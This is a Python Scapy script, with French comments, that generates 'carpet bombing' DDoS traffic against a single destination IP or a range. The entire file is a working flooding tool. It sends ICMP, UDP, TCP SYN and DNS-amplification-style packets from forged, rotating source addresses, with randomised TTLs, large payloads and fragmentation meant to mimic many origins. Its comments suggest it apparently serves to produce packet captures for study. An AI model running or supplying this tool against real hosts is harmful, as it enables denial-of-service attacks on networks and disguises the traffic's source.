from __future__ import annotations

import argparse
import ipaddress
import random
import time
from scapy.all import ICMP, IP, TCP, UDP, Raw, fragment, send

DEFAULT_TCP_PORTS = [21, 22, 25, 53, 80, 443, 8080]
DEFAULT_UDP_PORTS = [53, 123, 5000, 5353]
AMPLIFICATION_SOURCE_PORTS = [53, 123, 1900, 5353]

def parse_ip_range(raw_range):
    # Transformation d'une plage IP en liste d'adresses utilisables par Scapy
    start_raw, end_raw = raw_range.split("-", maxsplit=1)
    start_ip = int(ipaddress.ip_address(start_raw.strip()))
    end_ip = int(ipaddress.ip_address(end_raw.strip()))
    if start_ip > end_ip:
        raise ValueError("Invalid range: start IP is greater than end IP")
    return [str(ipaddress.ip_address(value)) for value in range(start_ip, end_ip + 1)]

def parse_src_ips(args):
    # Récupération des IP sources simulées : une IP, une plage ou une liste
    if args.src_ip:
        return [str(ipaddress.ip_address(args.src_ip.strip()))]
    if args.src_range:
        return parse_ip_range(args.src_range)
    if args.src_ips:
        src_ips = [src.strip() for src in args.src_ips.split(",") if src.strip()]
        if not src_ips:
            raise ValueError("--src-ips cannot be empty")
        return [str(ipaddress.ip_address(src)) for src in src_ips]
    raise ValueError("Provide one of --src-ip, --src-range, or --src-ips")

def parse_args():
    # Paramètres inspirés du générateur fragmenté proposé pendant la réunion
    parser = argparse.ArgumentParser(description="Advanced carpet bombing traffic generator")
    dst_group = parser.add_mutually_exclusive_group(required=True)
    dst_group.add_argument("--dst-ip", help="Single destination IP for classic DDoS")
    dst_group.add_argument("--dst-range", help="Destination range, ex: 10.0.0.1-10.0.0.80")
    src_group = parser.add_mutually_exclusive_group(required=True)
    src_group.add_argument("--src-ip", help="Single simulated source IP")
    src_group.add_argument("--src-range", help="Source range, ex: 10.0.1.1-10.0.1.4")
    src_group.add_argument("--src-ips", help="Comma-separated source IPs")
    parser.add_argument("--duration", type=int, default=30)
    parser.add_argument("--pps", type=int, default=100)
    parser.add_argument("--protocol", choices=["icmp", "udp", "tcp_syn", "dns_amp", "mixed"], default="udp")
    parser.add_argument("--payload-size", type=int, default=4000)
    parser.add_argument("--fragment-mode", choices=["manual", "auto", "none"], default="manual")
    parser.add_argument("--fragsize", type=int, default=300)
    parser.add_argument("--ttl-min", type=int, default=40)
    parser.add_argument("--ttl-max", type=int, default=64)
    parser.add_argument("--src-rotation-interval", type=float, default=5.0)
    parser.add_argument("--tcp-ports", nargs="+", type=int, default=DEFAULT_TCP_PORTS)
    parser.add_argument("--udp-ports", nargs="+", type=int, default=DEFAULT_UDP_PORTS)
    return parser.parse_args()

def choose_protocol(protocol):
    # Le mode mixed permet de mélanger plusieurs formes d'attaque dans la même capture
    if protocol == "mixed":
        return random.choice(["icmp", "udp", "tcp_syn", "dns_amp"])
    return protocol

def choose_ttl(ttl_min, ttl_max):
    # TTL variable pour simuler des paquets qui semblent venir de chemins différents
    if ttl_min > ttl_max:
        raise ValueError("--ttl-min cannot be greater than --ttl-max")
    return random.randint(ttl_min, ttl_max)

def build_packet(src_ip, dst_ip, protocol, payload_size, ttl, tcp_ports, udp_ports):
    # Création du paquet avec IP source forgée, destination ciblée et TTL choisi
    payload = Raw(b"A" * payload_size)
    ip_layer = IP(src=src_ip, dst=dst_ip, ttl=ttl, id=random.randint(1, 65535))
    if protocol == "icmp":
        return ip_layer / ICMP() / payload
    if protocol == "tcp_syn":
        return ip_layer / TCP(
            sport=random.randint(1024, 65535),
            dport=random.choice(tcp_ports),
            flags="S"
        ) / payload
    if protocol == "dns_amp":
        return ip_layer / UDP(
            sport=random.choice(AMPLIFICATION_SOURCE_PORTS),
            dport=random.randint(1024, 65535)
        ) / payload
    return ip_layer / UDP(
        sport=random.randint(1024, 65535),
        dport=random.choice(udp_ports)
    ) / payload

def send_packet(packet, fragment_mode, fragsize):
    # Fragmentation manuelle avec Scapy pour rendre les fragments visibles dans la capture
    if fragment_mode == "manual":
        send(fragment(packet, fragsize=fragsize), verbose=False)
        return
    send(packet, verbose=False)

def run():
    args = parse_args()
    src_ips = parse_src_ips(args)
    dst_ips = [args.dst_ip] if args.dst_ip else parse_ip_range(args.dst_range)
    sleep_interval = 1.0 / max(args.pps, 1)
    end_time = time.time() + args.duration
    current_src = random.choice(src_ips)
    next_src_rotation = time.time() + args.src_rotation_interval

    while time.time() < end_time:
        now = time.time()
        # Changement d'IP source toutes les N secondes pour simuler plusieurs origines
        if args.src_rotation_interval > 0 and now >= next_src_rotation:
            current_src = random.choice(src_ips)
            next_src_rotation = now + args.src_rotation_interval

        # Carpet bombing : une destination aléatoire est choisie dans le préfixe cible
        dst_ip = random.choice(dst_ips)
        protocol = choose_protocol(args.protocol)
        ttl = choose_ttl(args.ttl_min, args.ttl_max)
        packet = build_packet(
            src_ip=current_src,
            dst_ip=dst_ip,
            protocol=protocol,
            payload_size=args.payload_size,
            ttl=ttl,
            tcp_ports=args.tcp_ports,
            udp_ports=args.udp_ports,
        )
        send_packet(packet, args.fragment_mode, args.fragsize)
        time.sleep(sleep_interval)

    print("Advanced carpet bombing attack completed")

if __name__ == "__main__":
    run()
